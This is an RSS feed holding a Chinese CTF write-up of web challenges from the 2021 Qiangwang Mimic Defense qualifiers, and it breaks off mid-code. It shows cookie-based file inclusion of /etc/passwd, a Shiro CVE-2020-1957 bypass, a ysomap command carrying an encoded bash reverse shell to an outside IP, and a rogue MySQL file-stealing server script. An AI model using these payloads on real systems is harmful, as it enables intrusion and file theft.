<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Hexagon</title>
    <link>https://lemonprefect.cn/</link>
    
    <atom:link href="https://lemonprefect.cn/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>Why not trying to be stronger</description>
    <pubDate>Tue, 26 Oct 2021 05:17:30 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>4th 强网拟态防御 Quals</title>
      <link>https://lemonprefect.cn/zh-CN/posts/3c25c4ac.html</link>
      <guid>https://lemonprefect.cn/zh-CN/posts/3c25c4ac.html</guid>
      <pubDate>Mon, 25 Oct 2021 16:22:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;zerocalc&quot;&gt;&lt;a href=&quot;#zerocalc&quot; class=&quot;headerlink&quot; title=&quot;zerocalc&quot;&gt;&lt;/a&gt;zerocalc&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;计算器出现的第零天，爱他&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;根据题目的提示使用 readFile(‘./src/index.js’) 可以读出题目的 index.js 的源码。&lt;/p&gt;
&lt;figure class=&quot;highlight</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="zerocalc"><a href="#zerocalc" class="headerlink" title="zerocalc"></a>zerocalc</h3><blockquote><p>计算器出现的第零天，爱他</p></blockquote><p>根据题目的提示使用 readFile(‘./src/index.js’) 可以读出题目的 index.js 的源码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> notevil = <span class="built_in">require</span>(<span class="string">&quot;./notevil&quot;</span>); <span class="comment">// patched something...</span></span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieSession = <span class="built_in">require</span>(<span class="string">&quot;cookie-session&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(cookieSession(&#123;</span><br><span class="line">  name: <span class="string">&#x27;session&#x27;</span>,</span><br><span class="line">  keys: [<span class="built_in">Math</span>.random().toString(<span class="number">16</span>)],</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in root directory but name is randomized</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> utils = &#123;</span><br><span class="line">  <span class="keyword">async</span> <span class="function"><span class="title">md5</span>(<span class="params">s</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      resolve(crypto.createHash(<span class="string">&quot;md5&quot;</span>).update(s).digest(<span class="string">&quot;hex&quot;</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="keyword">async</span> <span class="function"><span class="title">readFile</span>(<span class="params">n</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      fs.readFile(n, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          reject(err);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          resolve(data);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = fs.readFileSync(<span class="string">&quot;./static/index.html&quot;</span>).toString();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> template.replace(<span class="string">&quot;&#123;&#123;res&#125;&#125;&quot;</span>, s.join(<span class="string">&#x27;&lt;br/&gt;&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.use(<span class="string">&quot;/&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> e = req.body.e;</span><br><span class="line">  <span class="keyword">const</span> his = req.session.his || [];</span><br><span class="line">  <span class="keyword">if</span> (e) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> ret = (<span class="keyword">await</span> notevil(e, utils)).toString();</span><br><span class="line">      his.unshift(<span class="string">`<span class="subst">$&#123;e&#125;</span> = <span class="subst">$&#123;ret&#125;</span>`</span>);</span><br><span class="line">      <span class="keyword">if</span> (his.length &gt; <span class="number">10</span>) &#123;</span><br><span class="line">        his.pop();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(error);</span><br><span class="line">      his.add(<span class="string">`<span class="subst">$&#123;e&#125;</span> = wrong?`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    req.session.his = his;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  res.send(render(his));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use(<span class="function">(<span class="params">err, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(err);</span><br><span class="line">  res.redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(process.env.PORT || <span class="number">8888</span>);</span><br></pre></td></tr></table></figure><p>可以发现程序使用了 notevil 进行了计算，同时提示 flag 在根目录下但是文件名随机。进一步读取 package.json 可以得到如下结果。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;name&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;0.1.1&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Description&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;private&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;main&quot;</span>: <span class="string">&quot;src/index.js&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;start:single&quot;</span>: <span class="string">&quot;node src/index.js&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;start&quot;</span>: <span class="string">&quot;pm2 start src/index.js -i 1&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;cookie-session&quot;</span>: <span class="string">&quot;^1.4.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;express&quot;</span>: <span class="string">&quot;^4.17.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;notevil&quot;</span>: <span class="string">&quot;^1.3.3&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;pm2&quot;</span>: <span class="string">&quot;^4.5.6&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;devDependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;@types/express&quot;</span>: <span class="string">&quot;^4.17.8&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;@types/node&quot;</span>: <span class="string">&quot;^14.10.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;prettier&quot;</span>: <span class="string">&quot;^2.0.5&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时可以发现其使用的 notevil 版本为 1.3.3，这个版本不存在已知的 RCE 漏洞。因此回来莽一下，直接 readFile(‘/flag’) 读出了 flag。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/63a00f26-6ebf-45c5-b60f-5101a333f96f/1635077140436527/cc1bb76f0a99000232aac3b028dde74cead46d63.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Hf4ulmUeLzShDRRfHdS4E8UhrlYbyMM6&#125;</span><br></pre></td></tr></table></figure><h3 id="new-hospital"><a href="#new-hospital" class="headerlink" title="new_hospital"></a>new_hospital</h3><blockquote><p>老大给了我一个网站，这个网站有漏洞，你能找到吗？</p></blockquote><p>稍微尝试一下可以发现 /feature.php 下的 Cookie 有一个 API 的值为 base64 的 2.js，猜测是文件读取，尝试构造成 /etc/passwd 可以发现如下报错。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">knowledge</span><br><span class="line">Warning: file_get_contents(.js): failed to open stream: No such file or directory in /var/www/html/feature.php on line 468</span><br></pre></td></tr></table></figure><p>可以发现他修改了 Cookie 内容。<a href="http://duitutu.cn/">@Du1L0v3</a> 稍微扫了一下可以发现存在一个 old 目录。</p><p>尝试访问一下 /old/feature.php 可以发现仍然是看起来差不多的页面，再次尝试这个漏洞，可以发现可以成功利用。当 Cookie 中的 API 为 L2V0Yy9wYXNzd2Q%3D 即 base64 编码再 urlencode 的 /etc/passwd 时可以得到如下内容，可以发现文件读取可以成功利用。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/album/63a00f26-6ebf-45c5-b60f-5101a333f96f/1635078362984142/6f50173d746db7c3def099f43bce95bd0b841da9.png"></p><p>尝试构造读取 flag，可以用 ../flag.php 编码后，也就是Li4vZmxhZy5waHA%3D 作为 Cookie 中 API 的值即可包含出如下内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="number">1</span>!=<span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hacker?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;wI91wqE1yQ3599fU5RFv3V2L7e0kquMm&#125;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因此可以得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;wI91wqE1yQ3599fU5RFv3V2L7e0kquMm&#125;</span><br></pre></td></tr></table></figure><h3 id="Jack-Shiro"><a href="#Jack-Shiro" class="headerlink" title="Jack-Shiro"></a>Jack-Shiro</h3><blockquote><p>一个简单的shiro</p></blockquote><p>附件中给出了如下 pom.xml。可以发现其中使用了 3.2.1 的 commons-collections 和 shiro 以及 logback-core。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.22.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ctf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">fork</span>&gt;</span>true<span class="tag">&lt;/<span class="name">fork</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>com.ctf.Application<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">goal</span>&gt;</span>repackage<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>尝试访问到 /login 后根据页面的提示定向到 /json，发现页面跳转回了 /login 且 URL 中加上了一个 jsessionid，因此想到了 shiro 的 CVE-2020-1957。尝试 /;/json 发现可以利用并成功到 /json。使用如下指令尝试使用一把梭 ysomap。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit LDAPLocalChainListener</span><br><span class="line">use payload  CommonsCollections8</span><br><span class="line">set lport 1389</span><br><span class="line">set version 3</span><br><span class="line">set args &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzNi44LjIxMC8zMjU1IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>运行 ysomap 之后向 /;/json 发送 POST 请求。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/63a00f26-6ebf-45c5-b60f-5101a333f96f/1635087912408769/3fd0c04ed118beb6e7a706f886c62d3ec079c8b9.png"></p><p>此时 ysomap 处即可回显利用，在事先监听的端口上可得 shell。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/63a00f26-6ebf-45c5-b60f-5101a333f96f/1635085599180664/635adeba46dc11ee3535e40c43698297960038b9.png"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/63a00f26-6ebf-45c5-b60f-5101a333f96f/1635085554326163/9415e7cbaa280e61f1d68997b353ab657e396ba6.png"></p><p>因此可以直接得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;XZgw550JXoWU0EI1ATBsTtZFSOwyX1FM&#125;</span><br></pre></td></tr></table></figure><h3 id="Give-me-your-0day"><a href="#Give-me-your-0day" class="headerlink" title="Give_me_your_0day"></a>Give_me_your_0day</h3><blockquote><p>小宁同学不会安装博客，你来帮帮她吧</p></blockquote><p>Typecho 会连接 MySQL，因此尝试使用 Rogue MySQL 一把梭。使用如下脚本搭建恶意 MySQL 服务端。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unhex</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123; <span class="keyword">return</span> pack(<span class="string">&quot;H*&quot;</span>, preg_replace(<span class="string">&#x27;#[^a-f0-9]+#si&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$str</span>)); &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$srv</span> = stream_socket_server(<span class="string">&quot;tcp://0.0.0.0:10026&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Enter filename to get [<span class="subst">$filename</span>] &gt; &quot;</span>;</span><br><span class="line">  <span class="variable">$newFilename</span> = rtrim(fgets(STDIN), <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$newFilename</span>)) &#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$newFilename</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;[.] Waiting for connection on 0.0.0.0:3306\n&quot;</span>;</span><br><span class="line">  <span class="variable">$s</span> = stream_socket_accept(<span class="variable">$srv</span>, -<span class="number">1</span>, <span class="variable">$peer</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;[+] Connection from <span class="subst">$peer</span> - greet... &quot;</span>;</span><br><span class="line">  fwrite(<span class="variable">$s</span>, unhex(<span class="string">&#x27;45 00 00 00 0a 35 2e 31  2e 36 33 2d 30 75 62 75</span></span><br><span class="line"><span class="string">                    6e 74 75 30 2e 31 30 2e  30 34 2e 31 00 26 00 00</span></span><br><span class="line"><span class="string">                    00 7a 42 7a 60 51 56 3b  64 00 ff f7 08 02 00 00</span></span><br><span class="line"><span class="string">                    00 00 00 00 00 00 00 00  00 00 00 00 64 4c 2f 44</span></span><br><span class="line"><span class="string">                    47 77 43 2a 43 56 63 72  00                     &#x27;</span>));</span><br><span class="line">  fread(<span class="variable">$s</span>, <span class="number">8192</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;auth ok... &quot;</span>;</span><br><span class="line">  fwrite(<span class="variable">$s</span>, unhex(<span class="string">&#x27;07 00 00 02 00 00 00 02  00 00 00&#x27;</span>));</span><br><span class="line">  fread(<span class="variable">$s</span>, <span class="number">8192</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;some shit ok... &quot;</span>;</span><br><span class="line">  fwrite(<span class="variable">$s</span>, unhex(<span class="string">&#x27;07 00 00 01 00 00 00 00  00 00 00&#x27;</span>));</span><br><span class="line">  fread(<span class="variable">$s</span>, <span class="number">8192</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;want file... &quot;</span>;</span><br><span class="line">  fwrite(<span class="variable">$s</span>, chr(strlen(<span class="variable">$filename</span>) + <span class="number">1</span>) . <span class="string">&quot;\x00\x00\x01\xFB&quot;</span> . <span class="variable">$filename</span>);</span><br><span class="line">  stream_socket_shutdown(<span class="variable">$s</span>, STREAM_SHUT_WR);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;[+] <span class="subst">$filename</span> from <span class="subst">$peer</span>:\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$len</span> = fread(<span class="variable">$s</span>, <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$len</span>)) &#123;</span><br><span class="line">    <span class="keyword">list</span> (, <span class="variable">$len</span>) = unpack(<span class="string">&quot;V&quot;</span>, <span class="variable">$len</span>);</span><br><span class="line">    <span class="variable">$len</span> &amp;= <span class="number">0xffffff</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$len</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="variable">$chunk</span> = fread(<span 